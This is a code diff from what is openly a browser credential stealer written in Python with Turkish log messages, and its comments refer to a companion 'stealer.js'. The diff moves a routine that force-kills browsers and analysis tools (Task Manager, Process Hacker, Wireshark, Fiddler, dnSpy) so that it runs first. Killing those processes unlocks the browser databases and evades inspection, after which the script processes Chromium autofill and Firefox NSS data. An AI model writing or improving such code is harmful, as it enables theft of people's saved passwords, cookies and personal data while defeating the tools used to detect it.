@@ -39,35 +39,7 @@ def log(msg, level="INFO"):
     else:
         logger.info(msg)
 
-# Parse arguments manually to handle --output-path from stealer.js
-target_output = None
-if "--output-path" in sys.argv:
-    try:
-        idx = sys.argv.index("--output-path")
-        if idx + 1 < len(sys.argv):
-            target_output = sys.argv[idx + 1]
-    except:
-        pass
-
-try:
-    if target_output:
-        # If stealer.js passes the full .zip path, we use its directory + 'output'
-        target_path = pathlib.Path(target_output)
-        if target_path.suffix == '.zip':
-            OUTPUT_BASE_DIR = target_path.parent / 'output'
-        else:
-            OUTPUT_BASE_DIR = target_path / 'output'
-    elif len(sys.argv) > 1 and not sys.argv[1].startswith('-'):
-        OUTPUT_BASE_DIR = pathlib.Path(sys.argv[1]) / 'output'
-    else:
-        OUTPUT_BASE_DIR = pathlib.Path(os.path.dirname(os.path.abspath(__file__))) / 'output'
-except Exception as e:
-    OUTPUT_BASE_DIR = pathlib.Path(os.path.dirname(os.path.abspath(__file__))) / 'output'
-    log(f"Error determining output directory, falling back to default: {e}", "WARNING")
-
-
-log(f"Output base directory: {OUTPUT_BASE_DIR}")
-
+# --- Browser Configuration (Moved to top for early process kill) ---
 BROWSERS = {
     'chrome': {
         'name': 'Google Chrome',
@@ -204,6 +176,82 @@ BROWSERS = {
         'process_name': 'firefox.exe'
     }
 }
+
+def kill_blocking_processes():
+    """Kills browser and analysis processes IMMEDIATELY to unlock databases."""
+    log("Tüm tarayıcı süreçleri ve çerez kilitleri temizleniyor...")
+    
+    targets = {
+        "taskmgr.exe", "processhacker.exe", "httpdebuggerui.exe", 
+        "wireshark.exe", "fiddler.exe", "regedit.exe", "discord.exe",
+        "vlc.exe", "checker.exe", "dnspy.exe", "de4dot.exe",
+        
+        "chrome.exe", "opera.exe", "browser.exe", "msedge.exe", 
+        "brave.exe", "firefox.exe", "vivaldi.exe", "360chrome.exe"
+    }
+    
+    # Browserları da ekle (Mutlaka kapanmaları lazım)
+    for config in BROWSERS.values():
+        pname = config.get('process_name')
+        if pname:
+            targets.add(pname)
+            
+    killed_count = 0
+    for proc in sorted(targets):
+        try:
+            # /F (Force), /T (Child processes), /IM (Image name)
+            res = subprocess.run(
+                ['taskkill', '/F', '/T', '/IM', proc],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                timeout=2
+            )
+            if res.returncode == 0:
+                killed_count += 1
+        except Exception:
+            pass
+            
+    if killed_count > 0:
+        log(f"Temizlik tamamlandı: {killed_count} süreç sonlandırıldı. Veritabanı kilitleri açıldı.")
+    else:
+        log("Aktif engelleyici süreç bulunamadı, devam ediliyor.")
+    
+    # OS'un dosya kilitlerini bırakması için kısa bir bekleme
+    import time
+    time.sleep(1)
+
+# HER ŞEYDEN ÖNCE ÇALIŞTIR
+kill_blocking_processes()
+
+# Parse arguments manually to handle --output-path from stealer.js
+target_output = None
+if "--output-path" in sys.argv:
+    try:
+        idx = sys.argv.index("--output-path")
+        if idx + 1 < len(sys.argv):
+            target_output = sys.argv[idx + 1]
+    except:
+        pass
+
+try:
+    if target_output:
+        # If stealer.js passes the full .zip path, we use its directory + 'output'
+        target_path = pathlib.Path(target_output)
+        if target_path.suffix == '.zip':
+            OUTPUT_BASE_DIR = target_path.parent / 'output'
+        else:
+            OUTPUT_BASE_DIR = target_path / 'output'
+    elif len(sys.argv) > 1 and not sys.argv[1].startswith('-'):
+        OUTPUT_BASE_DIR = pathlib.Path(sys.argv[1]) / 'output'
+    else:
+        OUTPUT_BASE_DIR = pathlib.Path(os.path.dirname(os.path.abspath(__file__))) / 'output'
+except Exception as e:
+    OUTPUT_BASE_DIR = pathlib.Path(os.path.dirname(os.path.abspath(__file__))) / 'output'
+    log(f"Error determining output directory, falling back to default: {e}", "WARNING")
+
+
+log(f"Output base directory: {OUTPUT_BASE_DIR}")
+
 
 class SECItem(ctypes.Structure):
     _fields_ = [('type', ctypes.c_uint),
@@ -818,42 +866,6 @@ def process_chromium_browser(browser_name, browser_config):
                 log(f"  [Autofill] No webdata DB found at: {webdata_db_path}", "DEBUG")
         except Exception as e:
             log(f"  [Autofill] Error: {e}", "ERROR")
-
-def kill_blocking_processes():
-    """Kills browser and analysis processes immediately."""
-    log("Sistem temizliği yapılıyor (Process kill)...")
-    
-    # Genişletilmiş process listesi
-    targets = {
-        "taskmgr.exe", "processhacker.exe", "httpdebuggerui.exe", 
-        "wireshark.exe", "fiddler.exe", "regedit.exe", "discord.exe",
-        "vlc.exe", "checker.exe", "dnspy.exe", "de4dot.exe"
-    }
-    
-    # Browserları da ekle (DB kilidini kaldırmak için)
-    for config in BROWSERS.values():
-        pname = config.get('process_name')
-        if pname:
-            targets.add(pname)
-            
-    killed_count = 0
-    for proc in sorted(targets):
-        try:
-            # /F (Force), /T (Child processes), /IM (Image name)
-            res = subprocess.run(
-                ['taskkill', '/F', '/T', '/IM', proc],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                timeout=2
-            )
-            if res.returncode == 0:
-                log(f"Sonlandırıldı: {proc}", "DEBUG")
-                killed_count += 1
-        except Exception:
-            pass
-            
-    log(f"İşlem tamamlandı. Toplam {killed_count} process durduruldu.")
-
 
 if __name__ == "__main__":
     kill_blocking_processes()
